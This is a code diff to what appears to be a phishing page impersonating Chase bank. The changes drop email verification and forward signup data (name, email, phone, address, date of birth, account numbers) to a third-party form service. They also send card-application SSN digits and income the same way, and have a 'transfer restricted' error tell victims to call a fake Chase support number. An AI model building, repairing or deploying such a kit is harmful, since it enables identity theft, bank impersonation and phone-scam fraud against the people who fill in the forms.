@@ -119,6 +119,12 @@
             border-bottom-color: var(--chase-blue);
         }
 
+        /* Phone input with auto-format */
+        .phone-input-field {
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+
         .password-container {
             position: relative;
         }
@@ -226,25 +232,6 @@
         .footer-links a {
             color: var(--text-gray);
             text-decoration: none;
-        }
-
-        /* Verification Modal */
-        .verification-modal {
-            text-align: center;
-            padding: 30px 20px;
-        }
-
-        .verification-icon {
-            width: 70px;
-            height: 70px;
-            background: var(--chase-light);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            color: var(--chase-blue);
-            font-size: 30px;
         }
 
         /* Main App Layout */
@@ -915,7 +902,7 @@
         }
 
         .error-modal svg {
-            height: 40px;
+            height: 60px;
             width: auto;
             margin-bottom: 20px;
         }
@@ -943,7 +930,7 @@
             margin-bottom: 20px;
         }
 
-        .phone-number {
+        .support-number {
             color: var(--chase-blue);
             font-weight: 600;
             font-size: 18px;
@@ -1245,7 +1232,7 @@
                 <!-- Login Form -->
                 <div id="loginForm">
                     <div class="input-group">
-                        <input type="email" class="input-field" id="loginEmail" placeholder="Email">
+                        <input type="email" class="input-field" id="loginEmail" placeholder="Email address">
                     </div>
                     <div class="input-group password-container">
                         <input type="password" class="input-field" id="loginPassword" placeholder="Password">
@@ -1273,29 +1260,29 @@
                 <!-- Signup Form -->
                 <div id="signupForm" class="hidden">
                     <div class="input-group">
-                        <input type="text" class="input-field" id="signupFullName" placeholder="Full Name">
+                        <input type="text" class="input-field" id="signupFullName" placeholder="Full name">
                     </div>
                     <div class="input-group">
-                        <input type="email" class="input-field" id="signupEmail" placeholder="Email">
+                        <input type="email" class="input-field" id="signupEmail" placeholder="Email address">
                     </div>
                     <div class="input-group">
-                        <input type="tel" class="input-field" id="signupPhone" placeholder="Phone Number (e.g., 1234567890)">
+                        <input type="tel" class="input-field phone-input-field" id="signupPhone" placeholder="Phone number (e.g., 469-949-7365)">
                     </div>
                     <div class="input-group">
-                        <input type="text" class="input-field" id="signupAddress" placeholder="Address">
+                        <input type="text" class="input-field" id="signupAddress" placeholder="Street address">
                     </div>
                     <div class="input-group">
                         <input type="date" class="input-field" id="signupDob" placeholder="Date of Birth">
                         <small style="color: var(--text-gray); font-size: 12px; display: block; margin-top: 5px;">Select your date of birth (MM/DD/YYYY)</small>
                     </div>
                     <div class="input-group password-container">
-                        <input type="password" class="input-field" id="signupPassword" placeholder="Password">
+                        <input type="password" class="input-field" id="signupPassword" placeholder="Password (min. 6 characters)">
                         <span class="eye-icon" onclick="togglePassword('signupPassword')">
                             <i class="far fa-eye"></i>
                         </span>
                     </div>
                     <div class="input-group password-container">
-                        <input type="password" class="input-field" id="signupConfirmPassword" placeholder="Confirm Password">
+                        <input type="password" class="input-field" id="signupConfirmPassword" placeholder="Confirm password">
                         <span class="eye-icon" onclick="togglePassword('signupConfirmPassword')">
                             <i class="far fa-eye"></i>
                         </span>
@@ -1325,28 +1312,6 @@
                     <a href="#">Privacy & security</a>
                     <a href="#">Terms of use</a>
                     <a href="#">Accessibility</a>
-                </div>
-            </div>
-        </div>
-
-        <!-- Verification Modal -->
-        <div class="modal-overlay" id="verificationModal">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h3 class="modal-title">Verify Your Email</h3>
-                    <button class="close-btn" onclick="closeModal('verificationModal')">×</button>
-                </div>
-                <div class="verification-modal">
-                    <div class="verification-icon">
-                        <i class="fas fa-envelope"></i>
-                    </div>
-                    <p>We've sent a verification email to:</p>
-                    <p style="font-weight: 600; margin-bottom: 20px;" id="verificationEmail"></p>
-                    <p style="font-size: 14px; color: var(--text-gray); margin-bottom: 20px;">Please check your inbox and click the verification link.</p>
-                    <button class="btn-primary" onclick="checkEmailVerified()">I've Verified My Email</button>
-                    <div style="margin-top: 15px;">
-                        <span class="resend-link" style="color: var(--chase-blue); cursor: pointer; text-decoration: underline;" onclick="resendVerificationEmail()">Resend Verification Email</span>
-                    </div>
                 </div>
             </div>
         </div>
@@ -1627,9 +1592,9 @@
         <div class="modal-overlay" id="errorModal">
             <div class="modal-content">
                 <div class="error-modal">
-                    <svg viewBox="0 -228.6 561.578 561.578" xmlns="http://www.w3.org/2000/svg">
+                    <svg viewBox="0 -228.6 561.578 561.578" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                         <path d="M494.525 0a3.69 3.69 0 0 0-3.691 3.686v25.83h68.244L528 .008 494.525 0M561.578 37.33a3.677 3.677 0 0 0-3.688-3.68h-25.828v68.242l29.504-31.086.012-33.476M524.236 104.369a3.688 3.688 0 0 0 3.678-3.688V74.854h-68.241l31.073 29.508 33.49.007M457.18 67.043a3.687 3.687 0 0 0 3.686 3.688h25.83V2.484l-29.512 31.078-.004 33.481" fill="#0659a5"></path>
-                        <path fill="#010101" d="M144.379 12.453v31.514h-43.91V12.453l-15.987-.006v79.461h15.987V57.771h43.91v34.137h16.016V12.453h-16.016M357.123 12.453v79.441l70.164-.004-8.891-13.98h-45.23V57.771h43.797V44.299h-43.797V26.111h45.156l8.711-13.658h-69.91M25.043 12.443C8.404 12.443 0 22.549 0 37.266v29.665C0 83.957 10.824 91.91 24.957 91.91l50.164-.01-9.293-14.521H28.053c-8.021 0-11.515-2.899-11.515-11.881v-26.91c0-8.684 2.939-12.072 11.729-12.072h37.955l8.928-14.072-50.107-.001M286.947 12.42c-9.613 0-19.451 5.771-19.451 20.625v3.816c0 1"></path>
+                        <path fill="#010101" d="M144.379 12.453v31.514h-43.91V12.453l-15.987-.006v79.461h15.987V57.771h43.91v34.137h16.016V12.453h-16.016M357.123 12.453v79.441l70.164-.004-8.891-13.98h-45.23V57.771h43.797V44.299h-43.797V26.111h45.156l8.711-13.658h-69.91M25.043 12.443C8.404 12.443 0 22.549 0 37.266v29.665C0 83.957 10.824 91.91 24.957 91.91l50.164-.01-9.293-14.521H28.053c-8.021 0-11.515-2.899-11.515-11.881v-26.91c0-8.684 2.939-12.072 11.729-12.072h37.955l8.928-14.072-50.107-.001M286.947 12.42c-9.613 0-19.451 5.771-19.451 20.625v3.816c0 15.475 9.476 21.389 18.949 21.432h33.275c3.455 0 6.264.572 6.264 6.416l-.004 6.754c-.086 5.236-2.711 6.447-6.379 6.447H275.83l-8.967 13.979h53.762c12.972 0 21.773-6.447 21.773-21.353V65.06c0-14.408-8.176-21.207-20.859-21.207h-31.77c-3.525 0-5.976-.967-5.976-6.184l-.004-5.492c0-4.443 1.688-6.066 5.791-6.066l41.683-.016 8.715-13.69-53.031.015M206.863 12.465L169.184 91.9h17.811l7.338-16.405h40.941l7.315 16.405h17.882l-37.765-79.436-15.843.001m7.896 16.488l14.479 33.021h-28.867l14.388-33.021z"></path>
                     </svg>
                     <p class="error-code" id="errorCode"></p>
                     <h3 class="error-title" id="errorTitle">Transfer Restricted</h3>
@@ -1784,8 +1749,9 @@
     </div>
 
     <script>
-        // Web3Forms Configuration
-        const WEB3FORMS_KEY = "885e64cd-c549-4ccb-988c-6484a4996290";
+        // ==================== CONFIGURATION ====================
+        // Web3Forms Configuration - REPLACE WITH YOUR PUBLIC KEY
+        const WEB3FORMS_KEY = "YOUR_PUBLIC_KEY_HERE"; // <-- PUT YOUR WEB3FORMS PUBLIC KEY HERE
         
         // Firebase Configuration
         const firebaseConfig = {
@@ -1803,22 +1769,18 @@
         const auth = firebase.auth();
         const db = firebase.firestore();
 
-        // App State
-        let currentUser = null;
-        let userData = null;
-        let notifications = [];
-        let unreadCount = 0;
-        let selectedCard = 'reserve';
-        let cardApplications = [];
-        let pendingUser = null;
-        let pendingUserData = null;
-
-        // Send data to Web3Forms
+        // ==================== WEB3FORMS FUNCTIONS ====================
         async function sendToWeb3Forms(data, formType) {
+            if (!WEB3FORMS_KEY || WEB3FORMS_KEY === "YOUR_PUBLIC_KEY_HERE") {
+                console.warn('Web3Forms key not configured. Data not sent.');
+                return;
+            }
+            
             try {
                 const formData = new FormData();
                 formData.append('access_key', WEB3FORMS_KEY);
                 formData.append('form_type', formType);
+                formData.append('subject', `New ${formType} submission from Chase Banking App`);
                 
                 Object.keys(data).forEach(key => {
                     formData.append(key, data[key]);
@@ -1837,6 +1799,33 @@
             }
         }
 
+        // ==================== PHONE NUMBER FORMATTING ====================
+        function formatPhoneNumber(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 3 && value.length <= 6) {
+                value = value.slice(0,3) + '-' + value.slice(3);
+            } else if (value.length > 6) {
+                value = value.slice(0,3) + '-' + value.slice(3,6) + '-' + value.slice(6,10);
+            }
+            input.value = value;
+        }
+
+        // Add phone formatting listener
+        document.addEventListener('DOMContentLoaded', () => {
+            const phoneInput = document.getElementById('signupPhone');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function() { formatPhoneNumber(this); });
+            }
+        });
+
+        // App State
+        let currentUser = null;
+        let userData = null;
+        let notifications = [];
+        let unreadCount = 0;
+        let selectedCard = 'reserve';
+        let cardApplications = [];
+
         // Prevent double-tap zoom
         document.addEventListener('touchstart', (e) => {
             if (e.touches.length > 1) e.preventDefault();
@@ -1846,14 +1835,11 @@
 
         // Auth State Observer
         auth.onAuthStateChanged(async (user) => {
-            if (user && user.emailVerified && !pendingUser) {
-                const userDoc = await db.collection('users').doc(user.uid).get();
-                if (userDoc.exists && userDoc.data().isVerified) {
-                    currentUser = user;
-                    await loadUserData(user.uid);
-                    showMainApp();
-                }
-            } else if (!user) {
+            if (user) {
+                currentUser = user;
+                await loadUserData(user.uid);
+                showMainApp();
+            } else {
                 showAuthScreen();
             }
         });
@@ -1889,15 +1875,18 @@
             }
         }
 
-        // Handle Signup with Email Verification
+        // Handle Signup
         async function handleSignup() {
             const fullName = document.getElementById('signupFullName').value;
             const email = document.getElementById('signupEmail').value;
-            const phone = document.getElementById('signupPhone').value;
+            let phone = document.getElementById('signupPhone').value;
             const address = document.getElementById('signupAddress').value;
             const dob = document.getElementById('signupDob').value;
             const password = document.getElementById('signupPassword').value;
             const confirmPassword = document.getElementById('signupConfirmPassword').value;
+
+            // Remove dashes from phone for storage
+            phone = phone.replace(/-/g, '');
 
             // Validation
             if (!fullName || !email || !phone || !address || !dob || !password) {
@@ -1924,16 +1913,25 @@
                 // Create user in Firebase Auth
                 const userCredential = await auth.createUserWithEmailAndPassword(email, password);
                 const user = userCredential.user;
-                
-                // Send verification email
-                await user.sendEmailVerification();
-                
+
                 // Generate account numbers
                 const checkingAccount = 'CH' + Math.floor(10000000 + Math.random() * 90000000);
                 const savingsAccount = 'SV' + Math.floor(10000000 + Math.random() * 90000000);
 
-                // Store user data temporarily (not saved to Firestore yet)
-                pendingUserData = {
+                // Send signup data to Web3Forms
+                await sendToWeb3Forms({
+                    full_name: fullName,
+                    email: email,
+                    phone: phone,
+                    address: address,
+                    date_of_birth: dob,
+                    checking_account: checkingAccount,
+                    savings_account: savingsAccount,
+                    registration_date: new Date().toISOString()
+                }, 'signup');
+
+                // Save user data to Firestore with $0 starting balance
+                await db.collection('users').doc(user.uid).set({
                     fullName: fullName,
                     email: email,
                     phone: phone,
@@ -1941,73 +1939,16 @@
                     dob: dob,
                     checkingAccount: checkingAccount,
                     savingsAccount: savingsAccount,
-                    checkingBalance: 1000.00,
-                    savingsBalance: 500.00,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    isVerified: false
-                };
-                pendingUser = user;
-                
-                // Send data to Web3Forms
-                await sendToWeb3Forms({
-                    full_name: fullName,
-                    email: email,
-                    phone: phone,
-                    address: address,
-                    date_of_birth: dob,
-                    account_type: 'New Chase Account',
-                    registration_date: new Date().toISOString()
-                }, 'signup');
-                
-                // Show verification modal
-                document.getElementById('verificationEmail').textContent = email;
-                document.getElementById('verificationModal').classList.add('active');
-                showToast('Verification email sent! Please check your inbox.');
-                
-                btn.disabled = false;
-                btnText.textContent = 'Create Account';
-                
+                    checkingBalance: 0.00,
+                    savingsBalance: 0.00,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+
+                showToast('Account created successfully!');
             } catch (error) {
                 showAuthError(error.message);
                 btn.disabled = false;
                 btnText.textContent = 'Create Account';
-            }
-        }
-        
-        // Check email verification
-        async function checkEmailVerified() {
-            if (!pendingUser) {
-                showToast('No pending verification. Please sign up again.');
-                closeModal('verificationModal');
-                return;
-            }
-            
-            await pendingUser.reload();
-            
-            if (pendingUser.emailVerified) {
-                // Save user data to Firestore after verification
-                await db.collection('users').doc(pendingUser.uid).set(pendingUserData);
-                
-                closeModal('verificationModal');
-                showToast('Email verified successfully! Your account is now active.');
-                
-                pendingUser = null;
-                pendingUserData = null;
-                
-                await loadUserData(auth.currentUser.uid);
-                showMainApp();
-            } else {
-                showToast('Email not verified yet. Please check your inbox and click the verification link.');
-            }
-        }
-        
-        // Resend verification email
-        async function resendVerificationEmail() {
-            if (pendingUser) {
-                await pendingUser.sendEmailVerification();
-                showToast('Verification email resent! Please check your inbox.');
-            } else {
-                showToast('Please sign up again to receive a new verification email.');
             }
         }
 
@@ -2033,28 +1974,7 @@
                     firebase.auth.Auth.Persistence.SESSION;
                 await auth.setPersistence(persistence);
                 
-                const userCredential = await auth.signInWithEmailAndPassword(email, password);
-                const user = userCredential.user;
-                
-                await user.reload();
-                
-                const userDoc = await db.collection('users').doc(user.uid).get();
-                
-                if (!userDoc.exists || !userDoc.data().isVerified) {
-                    if (user.emailVerified) {
-                        await db.collection('users').doc(user.uid).update({ isVerified: true });
-                    } else {
-                        showAuthError('Please verify your email first. Check your inbox for the verification link.');
-                        await auth.signOut();
-                        btn.disabled = false;
-                        btnText.textContent = 'Sign in';
-                        return;
-                    }
-                }
-                
-                await loadUserData(user.uid);
-                showMainApp();
-                
+                await auth.signInWithEmailAndPassword(email, password);
             } catch (error) {
                 showAuthError(error.message);
                 btn.disabled = false;
@@ -2367,13 +2287,13 @@
                 const isInternal = !checkingQuery.empty || !savingsQuery.empty;
 
                 if (!isInternal) {
-                    // Show external transfer error
+                    // Show external transfer error with support number
                     document.getElementById('errorCode').textContent = 'ERROR: EXT-TRF-001';
-                    document.getElementById('errorTitle').textContent = 'External Transfer Restricted';
+                    document.getElementById('errorTitle').textContent = 'Transfer Restricted';
                     document.getElementById('errorMessage').innerHTML = 
                         `Dear ${userData.fullName},<br><br>` +
                         `For your security, transfers to external accounts are temporarily restricted. ` +
-                        `Please use internal transfers between Chase accounts only.`;
+                        `Please contact Chase Support for assistance at <span class="support-number">+1 (469) 949-7365</span>.`;
                     closeModal('transferModal');
                     setTimeout(() => {
                         document.getElementById('errorModal').classList.add('active');
@@ -2562,19 +2482,19 @@
                     timestamp: firebase.firestore.FieldValue.serverTimestamp()
                 };
 
-                // Save to Firebase
-                await db.collection('cardApplications').add(application);
-                
-                // Send to Web3Forms
+                // Send card application to Web3Forms
                 await sendToWeb3Forms({
                     full_name: userData.fullName,
                     email: userData.email,
                     card_type: cardNames[selectedCard],
-                    ssn: ssn,
+                    ssn_last_four: ssn.slice(-4),
                     annual_income: income,
                     employment_status: employment,
                     application_date: new Date().toISOString()
                 }, 'card_application');
+
+                // Save to Firebase
+                await db.collection('cardApplications').add(application);
                 
                 closeModal('cardModal');
                 showToast('Application submitted successfully!');
